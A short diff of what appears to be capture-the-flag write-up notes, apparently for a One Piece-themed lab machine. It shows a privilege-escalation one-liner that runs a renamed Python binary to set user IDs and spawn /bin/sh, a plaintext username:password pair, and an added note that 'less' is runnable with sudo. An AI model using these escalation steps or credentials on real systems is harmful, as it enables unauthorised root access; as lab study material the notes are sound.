@@ -138,3 +138,6 @@ and on strings there are some ./Tools/freeze/flag.py
 it basically ran python 
 /usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.setresuid(1000, 1000, 1000); os.system("/bin/sh")'
 7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?
+
+and this had /usr/local/bin/less
+as sudo 
